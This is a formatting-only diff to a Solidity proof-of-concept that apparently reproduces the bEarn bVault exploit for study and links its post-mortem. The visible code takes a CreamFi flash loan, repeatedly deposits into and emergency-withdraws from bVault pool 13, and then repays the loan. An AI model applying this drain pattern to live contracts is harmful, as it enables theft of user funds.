@@ -16,18 +16,20 @@ import "../interface.sol";
 
 // @Analysis
 // Post-mortem : https://bearndao.medium.com/bvaults-busd-alpaca-strategy-exploit-post-mortem-and-bearn-s-compensation-plan-b0b38c3b5540
-// Twitter Guy : 
-// Hacking God : 
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 interface ICreamFi {
-    function flashLoan(address receiver, uint amount, bytes calldata params) external;
-    function getCash() external returns(uint256);
+    function flashLoan(address receiver, uint256 amount, bytes calldata params) external;
+    function getCash() external returns (uint256);
 }
 
 interface IBVault {
     function deposit(uint256 _pid, uint256 _wantAmt) external;
-    function emergencyWithdraw(uint256 _pid) external;
+    function emergencyWithdraw(
+        uint256 _pid
+    ) external;
 }
 
 contract bEarn is BaseTestWithBalanceLog {
@@ -53,11 +55,11 @@ contract bEarn is BaseTestWithBalanceLog {
     function executeOperation(address, address underlying, uint256 amount, uint256 fee, bytes memory) external {
         IERC20(BUSD).approve(bVault, type(uint256).max);
 
-        for(uint256 i=0;i<10;i++) {
-            IBVault(bVault).deposit(13, IERC20(underlying).balanceOf(address(this))-1);
+        for (uint256 i = 0; i < 10; i++) {
+            IBVault(bVault).deposit(13, IERC20(underlying).balanceOf(address(this)) - 1);
             IBVault(bVault).emergencyWithdraw(13);
         }
-        
-        IERC20(BUSD).transfer(CreamFi, amount+fee);
+
+        IERC20(BUSD).transfer(CreamFi, amount + fee);
     }
 }
